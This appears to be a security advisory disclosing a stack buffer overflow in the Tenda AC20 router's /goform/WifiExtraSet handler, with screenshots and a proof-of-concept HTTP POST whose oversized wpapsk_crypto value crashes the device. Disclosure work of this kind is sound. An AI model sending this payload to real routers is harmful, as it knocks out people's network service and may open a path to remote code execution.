# Information

# Tenda AC20 Router WifiExtraSet Buffer Overflow Vulnerability

**Vendor of the products:**   Shenzhen Tenda Technology Co.,Ltd.

**Vendor's website:** https://www.tenda.com.cn/

**Affected products:** AC20

**Affected firmware version:** <= V16.03.08.12

**Firmware download address:** [AC21 升级软件_腾达Tenda官方网站](https://www.tenda.com.cn/material/show/3264)

**Sumbitter:** Yun Zhang (@DavCloudz)

# Overview

A buffer overflow vulnerability was discovered on the latest version of the Tengda AC20 router, V16.03.08.12, where an attacker sent a well-crafted http post packet to the request path /goform/WifiExtraSet, triggering a denial of service attack or even RCE because there was no boundary check on the array, resulting in a stack overflow.

# Vulnerability details

The API for invoking the function:

<img width="1678" height="387" alt="image-20251029114459491" src="https://github.com/user-attachments/assets/9eec213d-1972-425f-933a-dbc4bd6b891b" />

Keep tracking the function:

<img width="1537" height="838" alt="image-20251029114522315" src="https://github.com/user-attachments/assets/0db6b9b3-ac8d-428a-89f2-96a0d2944058" />

<img width="795" height="375" alt="image-20251029114555297" src="https://github.com/user-attachments/assets/d2deda7b-8f16-4e2d-98de-b841d885b755" />

<img width="969" height="879" alt="image-20251029114618963" src="https://github.com/user-attachments/assets/92a0e3c5-b3f6-44c3-a813-a30c914cd9c1" />

The overflow was found to be due to the strcpy function not performing a security check, when constructing aaaaa..... Such a similar payload can cause an overflow:

<img width="1149" height="822" alt="image-20251029114631691" src="https://github.com/user-attachments/assets/6206c8b6-834d-4b40-9d2a-1ef86534ed77" />


# POC

```
POST /goform/WifiExtraSet HTTP/1.1
Host: 192.168.102.145
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/plain, */*; q=0.01
X-Requested-With: XMLHttpRequest
Referer: http://192.168.102.145/main.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 140

wifi_chkHz=0&wl_mode=ap2&security=wpapsk&wpapsk_type=wpa2&wpapsk_key=12345678&wpapsk_crypto=aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa
```

After running the payload, the Tenda AC20 system crashed and services became unavailable:
<img width="1359" height="926" alt="image-20251029114824061" src="https://github.com/user-attachments/assets/5e61b09b-fb06-4775-a4bb-56744c6a3b43" />

